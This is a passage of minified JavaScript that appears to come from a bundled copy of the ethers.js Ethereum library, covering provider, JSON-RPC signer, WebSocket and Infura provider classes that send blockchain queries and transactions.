e,i={};return["from","to"].forEach(n=>{t[n]!=null&&(i[n]=Promise.resolve(t[n]).then(s=>s?this._getAddress(s):null))}),["gasLimit","gasPrice","maxFeePerGas","maxPriorityFeePerGas","value"].forEach(n=>{t[n]!=null&&(i[n]=Promise.resolve(t[n]).then(s=>s?Ge.from(s):null))}),["type"].forEach(n=>{t[n]!=null&&(i[n]=Promise.resolve(t[n]).then(s=>s??null))}),t.accessList&&(i.accessList=this.formatter.accessList(t.accessList)),["data"].forEach(n=>{t[n]!=null&&(i[n]=Promise.resolve(t[n]).then(s=>s?Qe(s):null))}),this.formatter.transactionRequest(yield Un(i))})}_getFilter(e){return yr(this,void 0,void 0,function*(){e=yield e;const t={};return e.address!=null&&(t.address=this._getAddress(e.address)),["blockHash","topics"].forEach(i=>{e[i]!=null&&(t[i]=e[i])}),["fromBlock","toBlock"].forEach(i=>{e[i]!=null&&(t[i]=this._getBlockTag(e[i]))}),this.formatter.filter(yield Un(t))})}_call(e,t,i){return yr(this,void 0,void 0,function*(){i>=hde&&Fr.throwError("CCIP read exceeded maximum redirections",be.errors.SERVER_ERROR,{redirects:i,transaction:e});const n=e.to,s=yield this.perform("call",{transaction:e,blockTag:t});if(i>=0&&t==="latest"&&n!=null&&s.substring(0,10)==="0x556f1830"&&Ad(s)%32===4)try{const o=Nn(s,4),a=Nn(o,0,32);Ge.from(a).eq(n)||Fr.throwError("CCIP Read sender did not match",be.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s});const c=[],l=Ge.from(Nn(o,32,64)).toNumber(),u=Ge.from(Nn(o,l,l+32)).toNumber(),d=Nn(o,l+32);for(let m=0;m<u;m++){const x=G8(d,m*32);x==null&&Fr.throwError("CCIP Read contained corrupt URL string",be.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s}),c.push(x)}const h=cv(o,64);Ge.from(Nn(o,100,128)).isZero()||Fr.throwError("CCIP Read callback selector included junk",be.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s});const f=Nn(o,96,100),p=cv(o,128),g=yield this.ccipReadFetch(e,h,c);g==null&&Fr.throwError("CCIP Read disabled or provided no URLs",be.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:s});const w={to:n,data:Wo([f,pY([g,p])])};return this._call(w,t,i+1)}catch(o){if(o.code===be.errors.SERVER_ERROR)throw o}try{return Qe(s)}catch(o){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"call",params:{transaction:e,blockTag:t},result:s,error:o})}})}call(e,t){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const i=yield Un({transaction:this._getTransactionRequest(e),blockTag:this._getBlockTag(t),ccipReadEnabled:Promise.resolve(e.ccipReadEnabled)});return this._call(i.transaction,i.blockTag,i.ccipReadEnabled?0:-1)})}estimateGas(e){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const t=yield Un({transaction:this._getTransactionRequest(e)}),i=yield this.perform("estimateGas",t);try{return Ge.from(i)}catch(n){return Fr.throwError("bad result from backend",be.errors.SERVER_ERROR,{method:"estimateGas",params:t,result:i,error:n})}})}_getAddress(e){return yr(this,void 0,void 0,function*(){e=yield e,typeof e!="string"&&Fr.throwArgumentError("invalid address or ENS name","name",e);const t=yield this.resolveName(e);return t==null&&Fr.throwError("ENS name not configured",be.errors.UNSUPPORTED_OPERATION,{operation:`resolveName(${JSON.stringify(e)})`}),t})}_getBlock(e,t){return yr(this,void 0,void 0,function*(){yield this.getNetwork(),e=yield e;let i=-128;const n={includeTransactions:!!t};if(Jr(e,32))n.blockHash=e;else try{n.blockTag=yield this._getBlockTag(e),Jr(n.blockTag)&&(i=parseInt(n.blockTag.substring(2),16))}catch{Fr.throwArgumentError("invalid block hash or block tag","blockHashOrBlockTag",e)}return Hm(()=>yr(this,void 0,void 0,function*(){const s=yield this.perform("getBlock",n);if(s==null)return n.blockHash!=null&&this._emitted["b:"+n.blockHash]==null||n.blockTag!=null&&i>this._emitted.block?null:void 0;if(t){let o=null;for(let c=0;c<s.transactions.length;c++){const l=s.transactions[c];if(l.blockNumber==null)l.confirmations=0;else if(l.confirmations==null){o==null&&(o=yield this._getInternalBlockNumber(100+2*this.pollingInterval));let u=o-l.blockNumber+1;u<=0&&(u=1),l.confirmations=u}}const a=this.formatter.blockWithTransactions(s);return a.transactions=a.transactions.map(c=>this._wrapTransaction(c)),a}return this.formatter.block(s)}),{oncePoll:this})})}getBlock(e){return this._getBlock(e,!1)}getBlockWithTransactions(e){return this._getBlock(e,!0)}getTransaction(e){return yr(this,void 0,void 0,function*(){yield this.getNetwork(),e=yield e;const t={transactionHash:this.formatter.hash(e,!0)};return Hm(()=>yr(this,void 0,void 0,function*(){const i=yield this.perform("getTransaction",t);if(i==null)return this._emitted["t:"+e]==null?null:void 0;const n=this.formatter.transactionResponse(i);if(n.blockNumber==null)n.confirmations=0;else if(n.confirmations==null){let o=(yield this._getInternalBlockNumber(100+2*this.pollingInterval))-n.blockNumber+1;o<=0&&(o=1),n.confirmations=o}return this._wrapTransaction(n)}),{oncePoll:this})})}getTransactionReceipt(e){return yr(this,void 0,void 0,function*(){yield this.getNetwork(),e=yield e;const t={transactionHash:this.formatter.hash(e,!0)};return Hm(()=>yr(this,void 0,void 0,function*(){const i=yield this.perform("getTransactionReceipt",t);if(i==null)return this._emitted["t:"+e]==null?null:void 0;if(i.blockHash==null)return;const n=this.formatter.receipt(i);if(n.blockNumber==null)n.confirmations=0;else if(n.confirmations==null){let o=(yield this._getInternalBlockNumber(100+2*this.pollingInterval))-n.blockNumber+1;o<=0&&(o=1),n.confirmations=o}return n}),{oncePoll:this})})}getLogs(e){return yr(this,void 0,void 0,function*(){yield this.getNetwork();const t=yield Un({filter:this._getFilter(e)}),i=yield this.perform("getLogs",t);return i.forEach(n=>{n.removed==null&&(n.removed=!1)}),jt.arrayOf(this.formatter.filterLog.bind(this.formatter))(i)})}getEtherPrice(){return yr(this,void 0,void 0,function*(){return yield this.getNetwork(),this.perform("getEtherPrice",{})})}_getBlockTag(e){return yr(this,void 0,void 0,function*(){if(e=yield e,typeof e=="number"&&e<0){e%1&&Fr.throwArgumentError("invalid BlockTag","blockTag",e);let t=yield this._getInternalBlockNumber(100+2*this.pollingInterval);return t+=e,t<0&&(t=0),this.formatter.blockTag(t)}return this.formatter.blockTag(e)})}getResolver(e){return yr(this,void 0,void 0,function*(){let t=e;for(;;){if(t===""||t==="."||e!=="eth"&&t==="eth")return null;const i=yield this._getResolver(t,"getResolver");if(i!=null){const n=new QM(this,i,e);return t!==e&&!(yield n.supportsWildcard())?null:n}t=t.split(".").slice(1).join(".")}})}_getResolver(e,t){return yr(this,void 0,void 0,function*(){t==null&&(t="ENS");const i=yield this.getNetwork();i.ensAddress||Fr.throwError("network does not support ENS",be.errors.UNSUPPORTED_OPERATION,{operation:t,network:i.name});try{const n=yield this.call({to:i.ensAddress,data:"0x0178b8bf"+b5(e).substring(2)});return this.formatter.callAddress(n)}catch{}return null})}resolveName(e){return yr(this,void 0,void 0,function*(){e=yield e;try{return Promise.resolve(this.formatter.address(e))}catch(i){if(Jr(e))throw i}typeof e!="string"&&Fr.throwArgumentError("invalid ENS name","name",e);const t=yield this.getResolver(e);return t?yield t.getAddress():null})}lookupAddress(e){return yr(this,void 0,void 0,function*(){e=yield e,e=this.formatter.address(e);const t=e.substring(2).toLowerCase()+".addr.reverse",i=yield this._getResolver(t,"lookupAddress");if(i==null)return null;const n=G8(yield this.call({to:i,data:"0x691f3431"+b5(t).substring(2)}),0);return(yield this.resolveName(n))!=e?null:n})}getAvatar(e){return yr(this,void 0,void 0,function*(){let t=null;if(Jr(e)){const s=this.formatter.address(e).substring(2).toLowerCase()+".addr.reverse",o=yield this._getResolver(s,"getAvatar");if(!o)return null;t=new QM(this,o,s);try{const a=yield t.getAvatar();if(a)return a.url}catch(a){if(a.code!==be.errors.CALL_EXCEPTION)throw a}try{const a=G8(yield this.call({to:o,data:"0x691f3431"+b5(s).substring(2)}),0);t=yield this.getResolver(a)}catch(a){if(a.code!==be.errors.CALL_EXCEPTION)throw a;return null}}else if(t=yield this.getResolver(e),!t)return null;const i=yield t.getAvatar();return i==null?null:i.url})}perform(e,t){return Fr.throwError(e+" not implemented",be.errors.NOT_IMPLEMENTED,{operation:e})}_startEvent(e){this.polling=this._events.filter(t=>t.pollable()).length>0}_stopEvent(e){this.polling=this._events.filter(t=>t.pollable()).length>0}_addEventListener(e,t,i){const n=new gde(M2(e),t,i);return this._events.push(n),this._startEvent(n),this}on(e,t){return this._addEventListener(e,t,!1)}once(e,t){return this._addEventListener(e,t,!0)}emit(e,...t){let i=!1,n=[],s=M2(e);return this._events=this._events.filter(o=>o.tag!==s?!0:(setTimeout(()=>{o.listener.apply(this,t)},0),i=!0,o.once?(n.push(o),!1):!0)),n.forEach(o=>{this._stopEvent(o)}),i}listenerCount(e){if(!e)return this._events.length;let t=M2(e);return this._events.filter(i=>i.tag===t).length}listeners(e){if(e==null)return this._events.map(i=>i.listener);let t=M2(e);return this._events.filter(i=>i.tag===t).map(i=>i.listener)}off(e,t){if(t==null)return this.removeAllListeners(e);const i=[];let n=!1,s=M2(e);return this._events=this._events.filter(o=>o.tag!==s||o.listener!=t||n?!0:(n=!0,i.push(o),!1)),i.forEach(o=>{this._stopEvent(o)}),this}removeAllListeners(e){let t=[];if(e==null)t=this._events,this._events=[];else{const i=M2(e);this._events=this._events.filter(n=>n.tag!==i?!0:(t.push(n),!1))}return t.forEach(i=>{this._stopEvent(i)}),this}}var Mh=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const os=new be(_p),yde=["call","estimateGas"];function y5(r,e){if(r==null)return null;if(typeof r.message=="string"&&r.message.match("reverted")){const t=Jr(r.data)?r.data:null;if(!e||t)return{message:r.message,data:t}}if(typeof r=="object"){for(const t in r){const i=y5(r[t],e);if(i)return i}return null}if(typeof r=="string")try{return y5(JSON.parse(r),e)}catch{}return null}function gY(r,e,t){const i=t.transaction||t.signedTransaction;if(r==="call"){const s=y5(e,!0);if(s)return s.data;os.throwError("missing revert data in call exception; Transaction reverted without a reason string",be.errors.CALL_EXCEPTION,{data:"0x",transaction:i,error:e})}if(r==="estimateGas"){let s=y5(e.body,!1);s==null&&(s=y5(e,!1)),s&&os.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",be.errors.UNPREDICTABLE_GAS_LIMIT,{reason:s.message,method:r,transaction:i,error:e})}let n=e.message;throw e.code===be.errors.SERVER_ERROR&&e.error&&typeof e.error.message=="string"?n=e.error.message:typeof e.body=="string"?n=e.body:typeof e.responseText=="string"&&(n=e.responseText),n=(n||"").toLowerCase(),n.match(/insufficient funds|base fee exceeds gas limit|InsufficientFunds/i)&&os.throwError("insufficient funds for intrinsic transaction cost",be.errors.INSUFFICIENT_FUNDS,{error:e,method:r,transaction:i}),n.match(/nonce (is )?too low/i)&&os.throwError("nonce has already been used",be.errors.NONCE_EXPIRED,{error:e,method:r,transaction:i}),n.match(/replacement transaction underpriced|transaction gas price.*too low/i)&&os.throwError("replacement fee too low",be.errors.REPLACEMENT_UNDERPRICED,{error:e,method:r,transaction:i}),n.match(/only replay-protected/i)&&os.throwError("legacy pre-eip-155 transactions not supported",be.errors.UNSUPPORTED_OPERATION,{error:e,method:r,transaction:i}),yde.indexOf(r)>=0&&n.match(/gas required exceeds allowance|always failing transaction|execution reverted|revert/)&&os.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",be.errors.UNPREDICTABLE_GAS_LIMIT,{error:e,method:r,transaction:i}),e}function XM(r){return new Promise(function(e){setTimeout(e,r)})}function xde(r){if(r.error){const e=new Error(r.error.message);throw e.code=r.error.code,e.data=r.error.data,e}return r.result}function nb(r){return r&&r.toLowerCase()}const XT={};class mY extends b3{constructor(e,t,i){if(super(),e!==XT)throw new Error("do not call the JsonRpcSigner constructor directly; use provider.getSigner");Pe(this,"provider",t),i==null&&(i=0),typeof i=="string"?(Pe(this,"_address",this.provider.formatter.address(i)),Pe(this,"_index",null)):typeof i=="number"?(Pe(this,"_index",i),Pe(this,"_address",null)):os.throwArgumentError("invalid address or index","addressOrIndex",i)}connect(e){return os.throwError("cannot alter JSON-RPC Signer connection",be.errors.UNSUPPORTED_OPERATION,{operation:"connect"})}connectUnchecked(){return new Cde(XT,this.provider,this._address||this._index)}getAddress(){return this._address?Promise.resolve(this._address):this.provider.send("eth_accounts",[]).then(e=>(e.length<=this._index&&os.throwError("unknown account #"+this._index,be.errors.UNSUPPORTED_OPERATION,{operation:"getAddress"}),this.provider.formatter.address(e[this._index])))}sendUncheckedTransaction(e){e=ds(e);const t=this.getAddress().then(i=>(i&&(i=i.toLowerCase()),i));if(e.gasLimit==null){const i=ds(e);i.from=t,e.gasLimit=this.provider.estimateGas(i)}return e.to!=null&&(e.to=Promise.resolve(e.to).then(i=>Mh(this,void 0,void 0,function*(){if(i==null)return null;const n=yield this.provider.resolveName(i);return n==null&&os.throwArgumentError("provided ENS name resolves to null","tx.to",i),n}))),Un({tx:Un(e),sender:t}).then(({tx:i,sender:n})=>{i.from!=null?i.from.toLowerCase()!==n&&os.throwArgumentError("from address mismatch","transaction",e):i.from=n;const s=this.provider.constructor.hexlifyTransaction(i,{from:!0});return this.provider.send("eth_sendTransaction",[s]).then(o=>o,o=>(typeof o.message=="string"&&o.message.match(/user denied/i)&&os.throwError("user rejected transaction",be.errors.ACTION_REJECTED,{action:"sendTransaction",transaction:i}),gY("sendTransaction",o,s)))})}signTransaction(e){return os.throwError("signing transactions is unsupported",be.errors.UNSUPPORTED_OPERATION,{operation:"signTransaction"})}sendTransaction(e){return Mh(this,void 0,void 0,function*(){const t=yield this.provider._getInternalBlockNumber(100+2*this.provider.pollingInterval),i=yield this.sendUncheckedTransaction(e);try{return yield Hm(()=>Mh(this,void 0,void 0,function*(){const n=yield this.provider.getTransaction(i);if(n!==null)return this.provider._wrapTransaction(n,i,t)}),{oncePoll:this.provider})}catch(n){throw n.transactionHash=i,n}})}signMessage(e){return Mh(this,void 0,void 0,function*(){const t=typeof e=="string"?Fn(e):e,i=yield this.getAddress();try{return yield this.provider.send("personal_sign",[Qe(t),i.toLowerCase()])}catch(n){throw typeof n.message=="string"&&n.message.match(/user denied/i)&&os.throwError("user rejected signing",be.errors.ACTION_REJECTED,{action:"signMessage",from:i,messageData:e}),n}})}_legacySignMessage(e){return Mh(this,void 0,void 0,function*(){const t=typeof e=="string"?Fn(e):e,i=yield this.getAddress();try{return yield this.provider.send("eth_sign",[i.toLowerCase(),Qe(t)])}catch(n){throw typeof n.message=="string"&&n.message.match(/user denied/i)&&os.throwError("user rejected signing",be.errors.ACTION_REJECTED,{action:"_legacySignMessage",from:i,messageData:e}),n}})}_signTypedData(e,t,i){return Mh(this,void 0,void 0,function*(){const n=yield no.resolveNames(e,t,i,o=>this.provider.resolveName(o)),s=yield this.getAddress();try{return yield this.provider.send("eth_signTypedData_v4",[s.toLowerCase(),JSON.stringify(no.getPayload(n.domain,t,n.value))])}catch(o){throw typeof o.message=="string"&&o.message.match(/user denied/i)&&os.throwError("user rejected signing",be.errors.ACTION_REJECTED,{action:"_signTypedData",from:s,messageData:{domain:n.domain,types:t,value:n.value}}),o}})}unlock(e){return Mh(this,void 0,void 0,function*(){const t=this.provider,i=yield this.getAddress();return t.send("personal_unlockAccount",[i.toLowerCase(),e,null])})}}class Cde extends mY{sendTransaction(e){return this.sendUncheckedTransaction(e).then(t=>({hash:t,nonce:null,gasLimit:null,gasPrice:null,data:null,value:null,chainId:null,confirmations:0,from:null,wait:i=>this.provider.waitForTransaction(t,i)}))}}const Ede={chainId:!0,data:!0,gasLimit:!0,gasPrice:!0,nonce:!0,to:!0,value:!0,type:!0,accessList:!0,maxFeePerGas:!0,maxPriorityFeePerGas:!0};class zx extends vde{constructor(e,t){let i=t;i==null&&(i=new Promise((n,s)=>{setTimeout(()=>{this.detectNetwork().then(o=>{n(o)},o=>{s(o)})},0)})),super(i),e||(e=Ta(this.constructor,"defaultUrl")()),typeof e=="string"?Pe(this,"connection",Object.freeze({url:e})):Pe(this,"connection",Object.freeze(ds(e))),this._nextId=42}get _cache(){return this._eventLoopCache==null&&(this._eventLoopCache={}),this._eventLoopCache}static defaultUrl(){return"http://localhost:8545"}detectNetwork(){return this._cache.detectNetwork||(this._cache.detectNetwork=this._uncachedDetectNetwork(),setTimeout(()=>{this._cache.detectNetwork=null},0)),this._cache.detectNetwork}_uncachedDetectNetwork(){return Mh(this,void 0,void 0,function*(){yield XM(0);let e=null;try{e=yield this.send("eth_chainId",[])}catch{try{e=yield this.send("net_version",[])}catch{}}if(e!=null){const t=Ta(this.constructor,"getNetwork");try{return t(Ge.from(e).toNumber())}catch(i){return os.throwError("could not detect network",be.errors.NETWORK_ERROR,{chainId:e,event:"invalidNetwork",serverError:i})}}return os.throwError("could not detect network",be.errors.NETWORK_ERROR,{event:"noNetwork"})})}getSigner(e){return new mY(XT,this,e)}getUncheckedSigner(e){return this.getSigner(e).connectUnchecked()}listAccounts(){return this.send("eth_accounts",[]).then(e=>e.map(t=>this.formatter.address(t)))}send(e,t){const i={method:e,params:t,id:this._nextId++,jsonrpc:"2.0"};this.emit("debug",{action:"request",request:Id(i),provider:this});const n=["eth_chainId","eth_blockNumber"].indexOf(e)>=0;if(n&&this._cache[e])return this._cache[e];const s=qx(this.connection,JSON.stringify(i),xde).then(o=>(this.emit("debug",{action:"response",request:i,response:o,provider:this}),o),o=>{throw this.emit("debug",{action:"response",error:o,request:i,provider:this}),o});return n&&(this._cache[e]=s,setTimeout(()=>{this._cache[e]=null},0)),s}prepareRequest(e,t){switch(e){case"getBlockNumber":return["eth_blockNumber",[]];case"getGasPrice":return["eth_gasPrice",[]];case"getBalance":return["eth_getBalance",[nb(t.address),t.blockTag]];case"getTransactionCount":return["eth_getTransactionCount",[nb(t.address),t.blockTag]];case"getCode":return["eth_getCode",[nb(t.address),t.blockTag]];case"getStorageAt":return["eth_getStorageAt",[nb(t.address),Xi(t.position,32),t.blockTag]];case"sendTransaction":return["eth_sendRawTransaction",[t.signedTransaction]];case"getBlock":return t.blockTag?["eth_getBlockByNumber",[t.blockTag,!!t.includeTransactions]]:t.blockHash?["eth_getBlockByHash",[t.blockHash,!!t.includeTransactions]]:null;case"getTransaction":return["eth_getTransactionByHash",[t.transactionHash]];case"getTransactionReceipt":return["eth_getTransactionReceipt",[t.transactionHash]];case"call":return["eth_call",[Ta(this.constructor,"hexlifyTransaction")(t.transaction,{from:!0}),t.blockTag]];case"estimateGas":return["eth_estimateGas",[Ta(this.constructor,"hexlifyTransaction")(t.transaction,{from:!0})]];case"getLogs":return t.filter&&t.filter.address!=null&&(t.filter.address=nb(t.filter.address)),["eth_getLogs",[t.filter]]}return null}perform(e,t){return Mh(this,void 0,void 0,function*(){if(e==="call"||e==="estimateGas"){const n=t.transaction;if(n&&n.type!=null&&Ge.from(n.type).isZero()&&n.maxFeePerGas==null&&n.maxPriorityFeePerGas==null){const s=yield this.getFeeData();s.maxFeePerGas==null&&s.maxPriorityFeePerGas==null&&(t=ds(t),t.transaction=ds(n),delete t.transaction.type)}}const i=this.prepareRequest(e,t);i==null&&os.throwError(e+" not implemented",be.errors.NOT_IMPLEMENTED,{operation:e});try{return yield this.send(i[0],i[1])}catch(n){return gY(e,n,t)}})}_startEvent(e){e.tag==="pending"&&this._startPending(),super._startEvent(e)}_startPending(){if(this._pendingFilter!=null)return;const e=this,t=this.send("eth_newPendingTransactionFilter",[]);this._pendingFilter=t,t.then(function(i){function n(){e.send("eth_getFilterChanges",[i]).then(function(s){if(e._pendingFilter!=t)return null;let o=Promise.resolve();return s.forEach(function(a){e._emitted["t:"+a.toLowerCase()]="pending",o=o.then(function(){return e.getTransaction(a).then(function(c){return e.emit("pending",c),null})})}),o.then(function(){return XM(1e3)})}).then(function(){if(e._pendingFilter!=t){e.send("eth_uninstallFilter",[i]);return}return setTimeout(function(){n()},0),null}).catch(s=>{})}return n(),i}).catch(i=>{})}_stopEvent(e){e.tag==="pending"&&this.listenerCount("pending")===0&&(this._pendingFilter=null),super._stopEvent(e)}static hexlifyTransaction(e,t){const i=ds(Ede);if(t)for(const s in t)t[s]&&(i[s]=!0);o$(e,i);const n={};return["chainId","gasLimit","gasPrice","type","maxFeePerGas","maxPriorityFeePerGas","nonce","value"].forEach(function(s){if(e[s]==null)return;const o=Ky(Ge.from(e[s]));s==="gasLimit"&&(s="gas"),n[s]=o}),["from","to","data"].forEach(function(s){e[s]!=null&&(n[s]=Qe(e[s]))}),e.accessList&&(n.accessList=Zg(e.accessList)),n}}let x5=null;try{if(x5=WebSocket,x5==null)throw new Error("inject please")}catch{const e=new be(_p);x5=function(){e.throwError("WebSockets not supported in this environment",be.errors.UNSUPPORTED_OPERATION,{operation:"new WebSocket()"})}}var a_=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const T6=new be(_p);let _de=1;class Sde extends zx{constructor(e,t){t==="any"&&T6.throwError("WebSocketProvider does not support 'any' network yet",be.errors.UNSUPPORTED_OPERATION,{operation:"network:any"}),typeof e=="string"?super(e,t):super("_websocket",t),this._pollingInterval=-1,this._wsReady=!1,typeof e=="string"?Pe(this,"_websocket",new x5(this.connection.url)):Pe(this,"_websocket",e),Pe(this,"_requests",{}),Pe(this,"_subs",{}),Pe(this,"_subIds",{}),Pe(this,"_detectNetwork",super.detectNetwork()),this.websocket.onopen=()=>{this._wsReady=!0,Object.keys(this._requests).forEach(n=>{this.websocket.send(this._requests[n].payload)})},this.websocket.onmessage=n=>{const s=n.data,o=JSON.parse(s);if(o.id!=null){const a=String(o.id),c=this._requests[a];if(delete this._requests[a],o.result!==void 0)c.callback(null,o.result),this.emit("debug",{action:"response",request:JSON.parse(c.payload),response:o.result,provider:this});else{let l=null;o.error?(l=new Error(o.error.message||"unknown error"),Pe(l,"code",o.error.code||null),Pe(l,"response",s)):l=new Error("unknown error"),c.callback(l,void 0),this.emit("debug",{action:"response",error:l,request:JSON.parse(c.payload),provider:this})}}else if(o.method==="eth_subscription"){const a=this._subs[o.params.subscription];a&&a.processFunc(o.params.result)}else console.warn("this should not happen")};const i=setInterval(()=>{this.emit("poll")},1e3);i.unref&&i.unref()}get websocket(){return this._websocket}detectNetwork(){return this._detectNetwork}get pollingInterval(){return 0}resetEventsBlock(e){T6.throwError("cannot reset events block on WebSocketProvider",be.errors.UNSUPPORTED_OPERATION,{operation:"resetEventBlock"})}set pollingInterval(e){T6.throwError("cannot set polling interval on WebSocketProvider",be.errors.UNSUPPORTED_OPERATION,{operation:"setPollingInterval"})}poll(){return a_(this,void 0,void 0,function*(){return null})}set polling(e){e&&T6.throwError("cannot set polling on WebSocketProvider",be.errors.UNSUPPORTED_OPERATION,{operation:"setPolling"})}send(e,t){const i=_de++;return new Promise((n,s)=>{function o(c,l){return c?s(c):n(l)}const a=JSON.stringify({method:e,params:t,id:i,jsonrpc:"2.0"});this.emit("debug",{action:"request",request:JSON.parse(a),provider:this}),this._requests[String(i)]={callback:o,payload:a},this._wsReady&&this.websocket.send(a)})}static defaultUrl(){return"ws://localhost:8546"}_subscribe(e,t,i){return a_(this,void 0,void 0,function*(){let n=this._subIds[e];n==null&&(n=Promise.all(t).then(o=>this.send("eth_subscribe",o)),this._subIds[e]=n);const s=yield n;this._subs[s]={tag:e,processFunc:i}})}_startEvent(e){switch(e.type){case"block":this._subscribe("block",["newHeads"],t=>{const i=Ge.from(t.number).toNumber();this._emitted.block=i,this.emit("block",i)});break;case"pending":this._subscribe("pending",["newPendingTransactions"],t=>{this.emit("pending",t)});break;case"filter":this._subscribe(e.tag,["logs",this._getFilter(e.filter)],t=>{t.removed==null&&(t.removed=!1),this.emit(e.filter,this.formatter.filterLog(t))});break;case"tx":{const t=i=>{const n=i.hash;this.getTransactionReceipt(n).then(s=>{s&&this.emit(n,s)})};t(e),this._subscribe("tx",["newHeads"],i=>{this._events.filter(n=>n.type==="tx").forEach(t)});break}case"debug":case"poll":case"willPoll":case"didPoll":case"error":break;default:console.log("unhandled:",e);break}}_stopEvent(e){let t=e.tag;if(e.type==="tx"){if(this._events.filter(n=>n.type==="tx").length)return;t="tx"}else if(this.listenerCount(e.event))return;const i=this._subIds[t];i&&(delete this._subIds[t],i.then(n=>{this._subs[n]&&(delete this._subs[n],this.send("eth_unsubscribe",[n]))}))}destroy(){return a_(this,void 0,void 0,function*(){this.websocket.readyState===x5.CONNECTING&&(yield new Promise(e=>{this.websocket.onopen=function(){e(!0)},this.websocket.onerror=function(){e(!1)}})),this.websocket.close(1e3)})}}var Ade=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const Yb=new be(_p);class Ide extends zx{detectNetwork(){const e=Object.create(null,{detectNetwork:{get:()=>super.detectNetwork}});return Ade(this,void 0,void 0,function*(){let t=this.network;return t==null&&(t=yield e.detectNetwork.call(this),t||Yb.throwError("no network detected",be.errors.UNKNOWN_ERROR,{}),this._network==null&&(Pe(this,"_network",t),this.emit("network",t,null))),t})}}class T$ extends Ide{constructor(e,t){Yb.checkAbstract(new.target,T$),e=Ta(new.target,"getNetwork")(e),t=Ta(new.target,"getApiKey")(t);const i=Ta(new.target,"getUrl")(e,t);super(i,e),typeof t=="string"?Pe(this,"apiKey",t):t!=null&&Object.keys(t).forEach(n=>{Pe(this,n,t[n])})}_startPending(){Yb.warn("WARNING: API provider does not support pending filters")}isCommunityResource(){return!1}getSigner(e){return Yb.throwError("API provider does not support signing",be.errors.UNSUPPORTED_OPERATION,{operation:"getSigner"})}listAccounts(){return Promise.resolve([])}static getApiKey(e){return e}static getUrl(e,t){return Yb.throwError("not implemented; sub-classes must override getUrl",be.errors.NOT_IMPLEMENTED,{operation:"getUrl"})}}const Z8=new be(_p),Jb="84842078b09946638c03157f83405213";class Tde extends Sde{constructor(e,t){const i=new q9(e,t),n=i.connection;n.password&&Z8.throwError("INFURA WebSocket project secrets unsupported",be.errors.UNSUPPORTED_OPERATION,{operation:"InfuraProvider.getWebSocketProvider()"});const s=n.url.replace(/^http/i,"ws").replace("/v3/","/ws/v3/");super(s,e),Pe(this,"apiKey",i.projectId),Pe(this,"projectId",i.projectId),Pe(this,"projectSecret",i.projectSecret)}isCommunityResource(){return this.projectId===Jb}}class q9 extends T${static getWebSocketProvider(e,t){return new Tde(e,t)}static getApiKey(e){const t={apiKey:Jb,projectId:Jb,projectSecret:null};return e==null||(typeof e=="string"?t.projectId=e:e.projectSecret!=null?(Z8.assertArgument(typeof e.projectId=="string","projectSecret requires a projectId","projectId",e.projectId),Z8.assertArgument(typeof e.projectSecret=="string","invalid projectSecret","projectSecret","[REDACTED]"),t.projectId=e.projectId,t.projectSecret=e.projectSecret):e.projectId&&(t.projectId=e.projectId),t.apiKey=t.projectId),t}static getUrl(e,t){let i=null;switch(e?e.name:"unknown"){case"homestead":i="mainnet.infura.io";break;case"goerli":i="goerli.infura.io";break;case"sepolia":i="sepolia.infura.io";break;case"matic":i="polygon-mainnet.infura.io";break;case"maticmum":i="polygon-mumbai.infura.io";break;case"optimism":i="optimism-mainnet.infura.io";break;case"optimism-goerli":i="optimism-goerli.infura.io";break;case"optimism-sepolia":i="optimism-sepolia.infura.io";break;case"arbitrum":i="arbitrum-mainnet.infura.io";break;case"arbitrum-goerli":i="arbitrum-goerli.infura.io";break;case"arbitrum-sepolia":i="arbitrum-sepolia.infura.io";break;default:Z8.throwError("unsupported network",be.errors.INVALID_ARGUMENT,{argument:"network",value:e})}const n={allowGzip:!0,url:"https://"+i+"/v3/"+t.projectId,throttleCallback:(s,o)=>(t.projectId===Jb&&dde(),Promise.resolve(!0))};return t.projectSecret!=null&&(n.user="",n.password=t.projectSecret),n}isCommunityResource(){return this.projectId===Jb}}const eD=new be(_p);let kde=1;function tD(r,e){const t="Web3LegacyFetcher";return function(i,n){const s={method:i,params:n,id:kde++,jsonrpc:"2.0"};return new Promise((o,a)=>{this.emit("debug",{action:"request",fetcher:t,request:Id(s),provider:this}),e(s,(c,l)=>{if(c)return this.emit("debug",{action:"response",fetcher:t,error:c,request:s,provider:this}),a(c);if(this.emit("debug",{action:"response",fetcher:t,request:s,response:l,provider:this}),l.error){const u=new Error(l.error.message);return u.code=l.error.code,u.data=l.error.data,a(u)}o(l.result)})})}}function Nde(r){return function(e,t){t==null&&(t=[]);const i={method:e,params:t};return this.emit("debug",{action:"request",fetcher:"Eip1193Fetcher",request:Id(i),provider:this}),r.request(i).then(n=>(this.emit("debug",{action:"response",fetcher:"Eip1193Fetcher",request:i,response:n,provider:this}),n),n=>{throw this.emit("debug",{action:"response",fetcher:"Eip1193Fetcher",request:i,error:n,provider:this}),n})}}class $1 extends 